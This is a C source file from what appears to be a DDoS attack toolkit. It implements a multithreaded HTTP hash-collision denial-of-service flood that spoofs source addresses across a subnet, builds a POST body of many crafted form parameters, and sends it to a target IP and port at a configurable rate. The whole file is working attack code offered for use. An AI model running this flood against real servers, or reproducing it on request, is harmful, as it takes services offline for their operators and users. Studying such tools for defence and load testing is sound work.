#include "header.h"
#include "base/make_ipv4.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/hash_dos.h"
#include "base/make_tcp.h"

extern int g_num_threads;

// session counting
__u64 g_hash_dos_num_total;
__u64 g_hash_dos_num_generated_in_sec;
// from main()
InputArguments g_hash_dos_input;
__u32 g_hash_dos_request_per_sec;
// for masking next ip address
MaskingArguments g_hash_dos_now;
// thread
pthread_mutex_t g_hash_dos_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_hash_dos_cond;
// time checking
struct timespec g_hash_dos_before_time;
struct timespec g_hash_dos_now_time;

char g_hash_dos_content[1001];
char g_hash_dos_method[1300];

void HashDosPrintUsage(void)
{
  printf("Hash DOS Attack Usage : "
         "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
  return;
}

void *GenerateHashDos(void *data)
{
  int thread_id = *((int *)data);
  while (1) {
    // *** begin of critical section ***
    pthread_mutex_lock(&g_hash_dos_mutex);
    // get current resource
    GetMaskingArguments(&g_hash_dos_input, &g_hash_dos_now);
    // time check
    TimeCheck(
        &g_hash_dos_cond,
        &g_hash_dos_before_time,
        &g_hash_dos_now_time,
        &g_hash_dos_num_generated_in_sec);
    // wait a second
    if (g_hash_dos_num_generated_in_sec >= g_hash_dos_request_per_sec) {
      pthread_cond_wait(&g_hash_dos_cond, &g_hash_dos_mutex);
    }
    // make socket
    int src_port, seq, ack;
    int sock;

    sock =  MakeTcpConnection(
        inet_addr(g_hash_dos_now.src),
        inet_addr(g_hash_dos_now.dest),
        &src_port,
        g_hash_dos_now.port,
        &seq,
        &ack,
        0);
    TcpSocketSendData(
        sock,
        inet_addr(g_hash_dos_now.src),
        inet_addr(g_hash_dos_now.dest),
        src_port,
        g_hash_dos_now.port,
        g_hash_dos_method,
        strlen(g_hash_dos_method),
        seq,
        ack,
        0);
    close(sock);
    g_hash_dos_num_generated_in_sec++;
    g_hash_dos_num_total++;
    pthread_mutex_unlock(&g_hash_dos_mutex);
  }
  return NULL;
}

void *HashDosTimeCheck(void *data)
{
  while (1) {
    pthread_mutex_lock(&g_hash_dos_mutex);
    TimeCheck(
        &g_hash_dos_cond,
        &g_hash_dos_before_time,
        &g_hash_dos_now_time,
        &g_hash_dos_num_generated_in_sec);
    pthread_mutex_unlock(&g_hash_dos_mutex);
  }
  return NULL;
}

void HashDosMain(char *argv[])
{
  // argument check


  int argc = 0;
  while (argv[argc] != NULL) {
    argc++;
  }
  if (argc != 4) {
    HashDosPrintUsage();
    return;
  }
  ArgvToInputArguments(argv, &g_hash_dos_input);
  g_hash_dos_num_generated_in_sec = 0;
  g_hash_dos_num_total = 0;
  // prepare arbitary post method args
  unsigned int seed = time(NULL);
  srand(seed);

  char arg[21] = "arrrarrarrarrAaAa=1&";
  int index = 0, j = 0;
  for (int i = 0; i < 50; i++) {
    arg[13] = rand_r(&seed) % 26 + 'A';
    arg[14] = rand_r(&seed) % 26 + 'a';
    arg[15] = rand_r(&seed) % 26 + 'A';
    arg[16] = rand_r(&seed) % 26 + 'a';

    for (j = 0; j < 21; j++) {
      g_hash_dos_content[index+j] = arg[j];
    }
    index+=20;
  }
  g_hash_dos_content[index] = '\0';

  snprintf(g_hash_dos_method,
    sizeof(g_hash_dos_method),
    "POST / HTTP/1.1\r\nHost: %s\r\n"
    "User-Agent: python-requests/2.22.0\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Accept: */*\r\n"
    "Connection: keep-alive\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: %d\r\n\r\n",
    g_hash_dos_input.src,
    (int) sizeof(g_hash_dos_content));
  snprintf(g_hash_dos_method + strlen(g_hash_dos_method),
    strlen(g_hash_dos_content) + 3,
    "%s\r\n",
    g_hash_dos_content);
  memset(&g_hash_dos_before_time, 0, sizeof(struct timespec));
  memset(&g_hash_dos_now_time, 0, sizeof(struct timespec));

  g_hash_dos_request_per_sec = atoi(argv[3]);
  const int num_threads = g_num_threads;
  pthread_t threads[9999];
  int thread_ids[9999];

  printf("Sending Hash Dos requests to %s per %d\n",
      g_hash_dos_input.dest, g_hash_dos_request_per_sec);
  int i;
  for (i = 0; i < num_threads; i++) {
    pthread_create(
        &threads[i],
        NULL,
        GenerateHashDos,
        (void *)&thread_ids[i]);
  }
  pthread_create(&threads[i], NULL, HashDosTimeCheck, NULL);
  for (int i = 0; i < num_threads; i++) {
    printf("called\n");
    pthread_join(threads[i], NULL);
    printf("thread %d joined\n", i);
  }
  pthread_mutex_destroy(&g_hash_dos_mutex);
  printf("Hash Dos Attack Finished\nTotal %ld packets sent.\n",
      g_hash_dos_num_total);
  pthread_exit(NULL);
  return;
}
